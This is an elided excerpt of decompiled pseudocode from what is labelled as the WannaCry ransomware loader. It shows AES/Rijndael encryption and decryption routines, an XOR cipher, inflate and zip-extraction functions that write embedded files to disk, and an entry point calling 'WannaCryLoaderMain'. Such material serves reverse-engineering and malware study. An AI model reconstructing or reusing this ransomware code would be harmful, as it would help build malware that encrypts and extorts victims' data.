                      *(uint *)(&DAT_00409bfc + (uint)*(byte *)((int)puVar5 + 0x23) * 4) ^ *local_8;
            puVar5 = puVar5 + 1;
            param_2 = (byte *)((int)param_2 + 1);
            local_14 = local_14 + -1;
            local_8 = puVar1;
    ...
    if (0 < iVar3) {
      ...
      do {
        ...
        *pbVar6 = (&DAT_00408afc)[*(byte *)((int)param_3 + 3)] ^ (byte)((uint)uVar2 >> 0x18);
        pbVar6[1] = (&DAT_00408afc)
                    [*(byte *)(param_1 + 0x456 + ((local_1c + local_18) % iVar3) * 4)] ^
                    (byte)((uint)uVar2 >> 0x10);
        pbVar6[2] = (&DAT_00408afc)[*(byte *)(param_1 + 0x455 + (local_18 % iVar3) * 4)] ^
                    (byte)((uint)uVar2 >> 8);
        param_2._0_1_ = (byte)uVar2;
...
void __thiscall XorCipherBlock_00403A28(int param_1,byte *param_2,byte *param_3)
...
void __thiscall RijndaelTransformBuffer_00403A77(int param_1,void *param_2,int param_3,uint param_4,uint param_5)
    ...
    if ((int)((ulonglong)param_4 % (ulonglong)uVar1) == 0) {
      if (param_5 == 1) {
        ...
        if ((int)(((ulonglong)param_4 % (ulonglong)uVar1 << 0x20 | (ulonglong)param_4) /
                 (ulonglong)uVar1) != 0) {
          do {
            RijndaelDecryptBlock_00403797(param_2,param_3);
            XorCipherBlock_00403A28(param_3,param_1 + 0x3f0);
        ...
        if (bVar2) {
          if (param_4 / uVar1 != 0) {
            do {
              RijndaelEncryptBlock_0040350F(param_1 + 0x3f0,param_3);
              XorCipherBlock_00403A28(param_3,param_2);
              memcpy((void *)(param_1 + 0x3f0),param_2,*(size_t *)(param_1 + 0x3cc));
              uVar1 = *(uint *)(param_1 + 0x3cc);
              param_2 = (void *)((int)param_2 + uVar1);
              param_3 = param_3 + uVar1;
...
void FUN_00403cc8(undefined1 param_1,undefined1 param_2,undefined4 param_3,undefined4 param_4,
                 int param_5)
...
void FUN_00403cfc(uint param_1,int *param_2,int param_3)
  ...
  do {
    ...
    case 0:
      if (((undefined1 *)0x101 < local_10) && (9 < local_c)) {
        ...
        *(uint *)(iVar6 + 0x1c) = param_1;
        piVar7[1] = local_c;
        iVar5 = *piVar7;
        *piVar7 = (int)local_8;
        piVar7[2] = (int)(local_8 + (piVar7[2] - iVar5));
        *(undefined1 **)(iVar6 + 0x34) = puVar10;
        param_3 = FUN_0040514d((char)piVar3[4],*(undefined1 *)((int)piVar3 + 0x11),piVar3[5],
                               piVar3[6],iVar6,piVar7);
        local_8 = (byte *)*piVar7;
        local_c = piVar7[1];
        puVar10 = *(undefined1 **)(iVar6 + 0x34);
        param_2 = *(int **)(iVar6 + 0x20);
        param_1 = *(uint *)(iVar6 + 0x1c);
        if (puVar10 < *(undefined1 **)(iVar6 + 0x30)) {
          local_10 = *(undefined1 **)(iVar6 + 0x30) + (-1 - (int)puVar10);
        }
        else {
          local_10 = (undefined1 *)(*(int *)(iVar6 + 0x2c) - (int)puVar10);
        }
        if (param_3 != 0) {
...
switchD_00403d47_caseD_9:
    ...
    case 5:
      ...
      if (local_14 < *(undefined1 **)(iVar6 + 0x28)) {
        do {
          local_14 = local_14 + (*(int *)(iVar6 + 0x2c) - (int)*(undefined1 **)(iVar6 + 0x28));
        } while (local_14 < *(undefined1 **)(iVar6 + 0x28));
      }
      iVar5 = piVar3[1];
      while (iVar5 != 0) {
        puVar9 = puVar10;
        if (local_10 == (undefined1 *)0x0) {
          if (puVar10 == *(undefined1 **)(iVar6 + 0x2c)) {
            local_10 = *(undefined1 **)(iVar6 + 0x30);
            puVar9 = *(undefined1 **)(iVar6 + 0x28);
            if (local_10 != puVar9) {
              if (puVar9 < local_10) {
                local_10 = local_10 + (-1 - (int)puVar9);
              }
              else {
                local_10 = *(undefined1 **)(iVar6 + 0x2c) + -(int)puVar9;
              }
              puVar10 = puVar9;
          ...
          *(undefined1 **)(iVar6 + 0x34) = puVar10;
          param_3 = FUN_00403bd6(iVar6,piVar7,param_3);
          puVar9 = *(undefined1 **)(iVar6 + 0x34);
          puVar10 = *(undefined1 **)(iVar6 + 0x30);
          if (puVar9 < puVar10) {
            local_10 = puVar10 + (-1 - (int)puVar9);
          }
          else {
            local_10 = (undefined1 *)(*(int *)(iVar6 + 0x2c) - (int)puVar9);
          }
          if ((puVar9 == *(undefined1 **)(iVar6 + 0x2c)) &&
             (puVar4 = *(undefined1 **)(iVar6 + 0x28), puVar10 != puVar4)) {
            puVar9 = puVar4;
            if (puVar4 < puVar10) {
              local_10 = puVar10 + (-1 - (int)puVar4);
            }
            else {
              local_10 = *(undefined1 **)(iVar6 + 0x2c) + -(int)puVar4;
            }
          }
...
LAB_00404090:
        ...
        *puVar9 = *local_14;
        ...
        local_14 = local_14 + 1;
        local_10 = local_10 + -1;
        if (local_14 == *(undefined1 **)(iVar6 + 0x2c)) {
          local_14 = *(undefined1 **)(iVar6 + 0x28);
        }
        piVar1 = piVar3 + 1;
        *piVar1 = *piVar1 + -1;
        iVar5 = *piVar1;
...
LAB_004041b5:
    ...
    case 7:
      ...
      *(undefined1 **)(iVar6 + 0x34) = puVar10;
      param_3 = FUN_00403bd6(iVar6,piVar7,param_3);
      puVar10 = *(undefined1 **)(iVar6 + 0x34);
      if (*(undefined1 **)(iVar6 + 0x30) == puVar10) {
        *piVar3 = 8;
...
LAB_00404278:
      FUN_00403bd6(iVar6,piVar7,param_3);
      return;
    case 8:
...
void FUN_004043b6(uint *param_1,int *param_2,uint param_3)

{
  ...
  while (uVar9 < 10) {
    ...
    case (undefined *)0x40440f:
      for (; param_2 < 3; param_2 = (int *)((int)param_2 + 8)) {
      ...
      if (uVar9 == 1) {
        FUN_00405122(&local_28,&local_24,&local_20,&local_1c,piVar6);
        uVar9 = FUN_00403cc8(local_28,local_24,local_20,local_1c,piVar6);
        puVar5[1] = uVar9;
    ...
    case (undefined *)0x4044dc:
      for (; param_2 < 0x20; param_2 = (int *)((int)param_2 + 8)) {
        if (local_8 == 0) goto LAB_00404a58;
        param_3 = 0;
        local_8 = local_8 - 1;
        param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
...
LAB_00404a68:
      ...
      if (local_14 == 0) {
        ...
        puVar5[0xd] = (uint)local_c;
        param_3 = FUN_00403bd6(puVar5,piVar6,param_3);
        pvVar3 = (void *)puVar5[0xc];
...
LAB_0040461c:
    ...
    case (undefined *)0x40462b:
      for (; param_2 < 0xe; param_2 = (int *)((int)param_2 + 8)) {
        if (local_8 == 0) goto LAB_00404a58;
        param_3 = 0;
        local_8 = local_8 - 1;
        param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
...
switchD_00404408_caseD_4046b8:
      ...
      puVar5[4] = 7;
      local_10 = FUN_00404fa0(puVar5[3],puVar5 + 4,puVar5 + 5,puVar5[9],piVar6);
      if (local_10 == 0) {
        puVar5[2] = 0;
        *puVar5 = 5;
...
switchD_00404408_caseD_40476e:
      while (puVar5[2] < (puVar5[1] >> 5 & 0x1f) + 0x102 + (puVar5[1] & 0x1f)) {
        for (; param_2 < puVar5[4]; param_2 = (int *)((int)param_2 + 8)) {
          if (local_8 == 0) goto LAB_00404a58;
          param_3 = 0;
          local_8 = local_8 - 1;
          param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
        ...
        local_18 = *(uint *)(puVar5[5] + 4 +
                            (*(uint *)(&DAT_0040bca8 + puVar5[4] * 4) & (uint)param_1) * 8);
        bVar2 = *(byte *)(puVar5[5] + (*(uint *)(&DAT_0040bca8 + puVar5[4] * 4) & (uint)param_1) * 8
                         + 1);
        local_10 = (uint)bVar2;
        if (local_18 < 0x10) {
          ...
          *(uint *)(puVar5[3] + puVar5[2] * 4) = local_18;
          ...
          for (; param_2 < iVar7 + local_10; param_2 = (int *)((int)param_2 + 8)) {
            if (local_8 == 0) goto LAB_00404a58;
            param_3 = 0;
            local_8 = local_8 - 1;
            param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
...
LAB_00404a94:
            ...
            *piVar6 = (int)_Src;
            piVar6[2] = (int)(_Src + (piVar6[2] - iVar7));
            puVar5[0xd] = (uint)local_c;
            FUN_00403bd6(puVar5,piVar6,0xfffffffd);
            return;
          }
          if (local_18 == 0x10) {
      ...
      local_18 = 9;
      local_14 = 6;
      local_10 = FUN_0040501f((puVar5[1] & 0x1f) + 0x101,(puVar5[1] >> 5 & 0x1f) + 1,puVar5[3],
                              &local_18,&local_14,&local_30,&local_2c,puVar5[9],piVar6);
      if (local_10 == 0) {
        uVar9 = FUN_00403cc8(local_18,local_14,local_30,local_2c,piVar6);
        if (uVar9 == 0) goto LAB_00404b1c;
        puVar5[1] = uVar9;
        (*(code *)piVar6[9])(piVar6[10],puVar5[3]);
        *puVar5 = 6;
...
switchD_00404408_caseD_404935:
      ...
      *piVar6 = (int)_Src;
      piVar6[2] = (int)(_Src + (piVar6[2] - iVar7));
      puVar5[0xd] = (uint)local_c;
      param_3 = FUN_00403cfc(puVar5,piVar6,param_3);
      if (param_3 != 1) goto LAB_004049e5;
      param_3 = 0;
      FUN_004042af(puVar5[1],piVar6);
      local_8 = piVar6[1];
      _Src = (byte *)*piVar6;
...
switchD_00404408_caseD_404b95:
  ...
  *piVar6 = (int)_Src;
  ...
  puVar5[0xd] = (uint)local_c;
LAB_004049e5:
  FUN_00403bd6(puVar5,piVar6,param_3);
  return;
}
...
undefined4 FUN_0040514d(int param_1,int param_2,int param_3,int param_4,int param_5,int *param_6)
...
byte FUN_004055a3(undefined4 param_1,byte param_2)

{
  byte bVar1;
  
  bVar1 = FUN_00405588(param_1);
  FUN_00405535(param_1,param_2 ^ bVar1);
...
void FUN_004056dd(undefined4 param_1,size_t param_2,size_t param_3)
...
int FUN_0040583c(int *param_1,int param_2)
...
switchD_00405880_caseD_2:
  ...
  case 6:
    ...
    *(undefined4 *)(param_1[7] + 4) = 0;
    return -2;
  case 7:
    iVar3 = FUN_004043b6(puVar2[5],param_1,iVar3);
    if (iVar3 == -3) {
      *(undefined4 *)param_1[7] = 0xd;
      *(undefined4 *)(param_1[7] + 4) = 0;
      iVar3 = -3;
...
undefined1 * FUN_00405bae(LPCSTR param_1,undefined4 param_2,int param_3,undefined4 *param_4)
...

{
  ...
  iVar1 = FUN_00405d8a((int)&uStack_8 + 3,1,1,param_1);
  if (iVar1 == 1) {
...

{
  ...
  param_1 = 0;
  iVar1 = FUN_00405edf(iVar4);
  if (iVar1 == -1) {
    param_1 = -1;
  }
  iVar2 = FUN_00405d0e(iVar4,iVar1,0);
  if (iVar2 != 0) {
    param_1 = -1;
  }
  iVar2 = FUN_00405e6b(iVar4,local_14);
  if (iVar2 != 0) {
    param_1 = -1;
  }
  iVar2 = FUN_00405e27(iVar4,&local_8);
  if (iVar2 != 0) {
    param_1 = -1;
  }
  iVar2 = FUN_00405e27(iVar4,&local_10);
  if (iVar2 != 0) {
    param_1 = -1;
  }
  iVar2 = FUN_00405e27(iVar4,local_94 + 1);
  if (iVar2 != 0) {
    param_1 = -1;
  }
  iVar2 = FUN_00405e27(iVar4,&local_c);
  if (iVar2 != 0) {
    param_1 = -1;
  }
  ...
  iVar2 = FUN_00405e6b(iVar4,&local_74);
  if (iVar2 != 0) {
    param_1 = -1;
  }
  iVar2 = FUN_00405e6b(iVar4,local_70);
  if (iVar2 != 0) {
    param_1 = -1;
  }
  iVar2 = FUN_00405e27(iVar4,local_8c);
  if (iVar2 != 0) {
    param_1 = -1;
  }
...

{
  ...
  iVar1 = FUN_00405d0e(*param_1,param_1[5] + param_1[3],0);
  if (iVar1 == 0) {
    iVar1 = FUN_00405e6b(*param_1,&local_c);
    if (iVar1 == 0) {
  ...
  iVar1 = FUN_00405e27(*param_1,&local_60);
  if (iVar1 != 0) {
    local_8 = -1;
  }
  iVar1 = FUN_00405e27(*param_1,local_5c);
  if (iVar1 != 0) {
    local_8 = -1;
  }
  iVar1 = FUN_00405e27(*param_1,local_58);
  if (iVar1 != 0) {
    local_8 = -1;
  }
  iVar1 = FUN_00405e27(*param_1,local_54);
  if (iVar1 != 0) {
    local_8 = -1;
  }
  iVar1 = FUN_00405e6b(*param_1,&local_50);
  if (iVar1 != 0) {
    local_8 = -1;
  }
  FUN_00406191(local_50,local_28);
  iVar1 = FUN_00405e6b(*param_1,local_4c);
  if (iVar1 != 0) {
    local_8 = -1;
  }
  iVar1 = FUN_00405e6b(*param_1,local_48);
  if (iVar1 != 0) {
    local_8 = -1;
  }
  iVar1 = FUN_00405e6b(*param_1,local_44);
  if (iVar1 != 0) {
    local_8 = -1;
  }
  iVar1 = FUN_00405e27(*param_1,&local_40);
  if (iVar1 != 0) {
    local_8 = -1;
  }
  iVar1 = FUN_00405e27(*param_1,&local_3c);
  if (iVar1 != 0) {
    local_8 = -1;
  }
  iVar1 = FUN_00405e27(*param_1,&local_38);
  if (iVar1 != 0) {
    local_8 = -1;
  }
  iVar1 = FUN_00405e27(*param_1,local_34);
  if (iVar1 != 0) {
    local_8 = -1;
  }
  iVar1 = FUN_00405e27(*param_1,local_30);
  if (iVar1 != 0) {
    local_8 = -1;
  }
  iVar1 = FUN_00405e6b(*param_1,local_2c);
  if (iVar1 != 0) {
    local_8 = -1;
  }
  iVar1 = FUN_00405e6b(*param_1,&local_10);
  if (iVar1 != 0) {
    local_8 = -1;
  }
  uVar2 = local_40;
  if (local_8 == 0) {
    if (param_4 != 0) {
      ...
      if (((local_40 != 0) && (param_5 != 0)) &&
         (iVar1 = FUN_00405d8a(param_4,uVar2,1,*param_1), iVar1 != 1)) {
        local_8 = -1;
      }
    ...
    if (param_6 != 0) {
      ...
      if (uVar2 != 0) {
        iVar1 = FUN_00405d0e(*param_1,uVar2,1);
        if (iVar1 == 0) {
      ...
      if (((local_3c != 0) && (param_7 != 0)) &&
         (iVar1 = FUN_00405d8a(param_6,uVar4,1,*puVar3), iVar1 != 1)) {
        local_8 = -1;
      }
...
LAB_00406438:
  if (local_8 == 0) {
    if (param_8 != 0) {
      ...
      if ((iVar1 != 0) && (iVar1 = FUN_00405d0e(*puVar3,iVar1,1), iVar1 != 0)) {
        local_8 = -1;
      }
      if (((local_38 != 0) && (param_9 != 0)) &&
         (iVar1 = FUN_00405d8a(param_8,uVar2,1,*puVar3), iVar1 != 1)) {
        local_8 = -1;
      }
      if (local_8 != 0) {
        return local_8;
...
undefined4 FUN_0040671d(undefined4 *param_1,char *param_2)
...
int FUN_00406880(uint param_1,int param_2,uint param_3,undefined1 *param_4)
...
int * __thiscall FUN_00406b8e(int *param_1,HANDLE param_2,undefined4 param_3,int param_4)

{
  ...
  if ((*param_1 == 0) && (param_1[1] == -1)) {
    ...
    if ((param_4 == 1) && (DVar3 = SetFilePointer(param_2,0,(PLONG)0x0,1), DVar3 == 0xffffffff)) {
      local_8 = (int *)0x2000000;
    }
    else {
      iVar4 = FUN_00405bae(param_2,param_3,param_4,&local_8);
      if (iVar4 != 0) {
...
undefined4 __thiscall FUN_00406c40(int *param_1,int param_2,undefined4 *param_3)

{
  ...
  if (param_2 == param_1[0x4d]) {
    ...
    if (param_2 < *(int *)(*param_1 + 0x10)) {
      FUN_004064e2(*param_1);
    }
    while (*(int *)(*param_1 + 0x10) < param_2) {
      FUN_00406520(*param_1);
    }
    FUN_004064bb(*param_1,local_7c,local_180,0x104,0,0,0,0);
    iVar6 = FUN_0040657a(*param_1,local_2c,&local_14,&local_10);
    if (iVar6 != 0) {
      return 0x700;
    }
    iVar6 = FUN_00405d0e(*(undefined4 *)*param_1,local_14,0);
    if (iVar6 == 0) {
      local_c = operator_new(local_10);
      uVar7 = FUN_00405d8a(local_c,1,local_10,*(undefined4 *)*param_1);
      if (uVar7 == local_10) {
        *param_3 = *(undefined4 *)(*param_1 + 0x10);
        ...
        strcpy((char *)(param_3 + 1),(char *)_Str);
        param_3._3_1_ = 0;
        local_5 = 0;
        ...
        _Src[0x49] = local_64;
        _Src[0x4a] = local_60;
        local_28 = (FILETIME)FUN_00406b23(local_6c >> 0x10,local_6c);
        ...
        if (4 < local_10) {
          do {
            uVar7 = (uint)local_c >> 0x10;
            local_c._0_2_ =
                 CONCAT11(*(undefined1 *)((int)pvVar4 + iVar6 + 1),
                          *(undefined1 *)(iVar6 + (int)pvVar4));
            local_c = (void *)(CONCAT22((short)uVar7,(undefined2)local_c) & 0xff00ffff);
            ...
            if (iVar9 == 0) {
              ...
              iVar9 = iVar6 + 5;
              if ((bVar10 & 1) != 0) {
                puVar1 = (undefined1 *)(iVar9 + (int)pvVar4);
                iVar9 = iVar6 + 9;
                uVar12 = FUN_00406b02(CONCAT31(CONCAT21(*(undefined2 *)(puVar1 + 2),
                                                        *(undefined1 *)(iVar6 + 6 + (int)pvVar4)),
                                               *puVar1));
              ...
              if (local_5 != 0) {
                uVar12 = FUN_00406b02(CONCAT31(CONCAT21(*(undefined2 *)
                                                         ((undefined1 *)(iVar9 + (int)pvVar4) + 2),
                                                        *(undefined1 *)(iVar9 + 1 + (int)pvVar4)),
                                               *(undefined1 *)(iVar9 + (int)pvVar4)));
...
void CreateDirectoryTree_00407070(LPCSTR param_1,char *param_2)

{
  ...
  if (cVar1 != '\0') {
    ...
    if (pcVar4 != param_2) {
      ...
      CreateDirectoryTree_00407070(param_1,local_20c);
    }
    local_108[0] = '\0';
...
int __thiscall ExtractZipEntry_00407136(int *param_1,char *param_2,char *param_3,int param_4,int param_5)

{
  ...
  if (param_5 == 3) {
    if (param_2 != (char *)param_1[1]) {
      ...
      while (*(int *)(*param_1 + 0x10) < iVar5) {
        FUN_00406520(*param_1);
      }
      FUN_0040671d(*param_1,param_1[0x4e]);
      param_1[1] = iVar5;
    }
    iVar5 = FUN_00406880(*param_1,param_3,param_4,(int)&param_2 + 3);
    if (iVar5 < 1) {
      FUN_00406a97(*param_1);
      param_1[1] = -1;
    }
  ...
  iVar5 = *param_1;
  param_1[1] = -1;
  if (*(int *)(iVar5 + 4) <= (int)param_2) {
    return 0x10000;
  }
  if ((int)param_2 < *(int *)(iVar5 + 0x10)) {
    FUN_004064e2(iVar5);
  }
  while (*(int *)(*param_1 + 0x10) < iVar3) {
    FUN_00406520(*param_1);
  }
  ...
  if ((local_130 & 0x10) != 0) {
    ...
    cVar4 = *param_3;
    if (((cVar4 == '/') || (cVar4 == '\\')) || ((cVar4 != '\0' && (param_3[1] == ':')))) {
      param_1 = (int *)0x0;
    }
    else {
      param_1 = param_1 + 0x50;
    }
    CreateDirectoryTree_00407070(param_1,param_3);
    return 0;
  }
  ...
  if (pcVar10 == pcVar6) {
    local_10c[0] = '\0';
LAB_004072e1:
    wsprintfA(local_33c,s__s_s_s_0040f848,param_1 + 0x50,local_10c,pcVar10);
    CreateDirectoryTree_00407070(param_1 + 0x50,local_10c);
  }
  else {
    ...
    CreateDirectoryTree_00407070(0,local_10c);
  }
  pcVar6 = CreateFileA(local_33c,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,local_130,(HANDLE)0x0);
LAB_00407331:
  ...
  if (param_1[0x4f] == 0) {
    ...
    param_1[0x4f] = (int)pvVar7;
  }
  param_4 = 0;
  do {
    nNumberOfBytesToWrite = FUN_00406880(*param_1,param_1[0x4f],0x4000,(int)&param_3 + 3);
    ...
    if ((0 < (int)nNumberOfBytesToWrite) &&
       (BVar8 = WriteFile(param_2,(LPCVOID)param_1[0x4f],nNumberOfBytesToWrite,&local_8,
                          (LPOVERLAPPED)0x0), BVar8 == 0)) {
      param_4 = 0x400;
      goto LAB_0040745a;
    }
    if (param_3._3_1_ != '\0') {
      SetFileTime(param_2,&local_124,&local_12c,local_11c);
      goto LAB_0040745a;
    }
...
undefined4 __fastcall CloseZipContextInternal_0040747B(int *param_1)
...
undefined4 * OpenZipArchiveInternal_004074A4(void)

{
  ...
  *(undefined4 *)(unaff_EBP + -4) = 0;
  if (pvVar1 == (void *)0x0) {
    ...
    pvVar1 = (void *)ZipContext_Construct_00407527(*(undefined4 *)(unaff_EBP + 0x14));
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
...
undefined4 * __thiscall ZipContext_Construct_00407527(undefined4 *param_1,char *param_2)
...
void __fastcall ZipContext_Cleanup_00407572(int param_1)
...
void OpenEmbeddedZipArchive_004075AD(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  OpenZipArchiveInternal_004074A4(param_1,param_2,3,param_3);
  return;
}



void QueryEmbeddedZipEntry_004075C4(int *param_1,undefined4 param_2,undefined4 *param_3)
...
void ExtractEmbeddedZipEntryEx_00407603(int *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5)

{
  if (param_1 == (int *)0x0) {
    ...
    DAT_0040f938 = ExtractZipEntry_00407136(param_2,param_3,param_4,param_5);
  }
  else {
    DAT_0040f938 = 0x80000;
  }
...
void ExtractEmbeddedZipEntryToDisk_0040763D(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  ExtractEmbeddedZipEntryEx_00407603(param_1,param_2,param_3,0,2);
  return;
}



undefined4 CloseEmbeddedZipArchive_00407656(int *param_1)

{
  ...
  if (param_1 == (int *)0x0) {
    ...
    if (*param_1 == 1) {
      ...
      DAT_0040f938 = CloseZipContextInternal_0040747B();
      if (pvVar1 != (void *)0x0) {
        ZipContext_Cleanup_00407572();
        operator_delete(pvVar1);
      }
...

{
  ...
  *puVar1 = DAT_0040f944;
  ...
  UserMathErrorStub_0040793F();
  if (DAT_0040f870 == 0) {
    __setusermatherr(&LAB_0040793c);
  }
  ConfigureFloatingPointRuntime_0040792A();
...
LAB_004078ad:
  ...
  local_6c = WannaCryLoaderMain_00401FE7(pHVar3,uVar5,pbVar4,uVar2);
                    // WARNING: Subroutine does not return
  exit(local_6c);
}
...
void ConfigureFloatingPointRuntime_0040792A(void)
...
void UserMathErrorStub_0040793F(void)
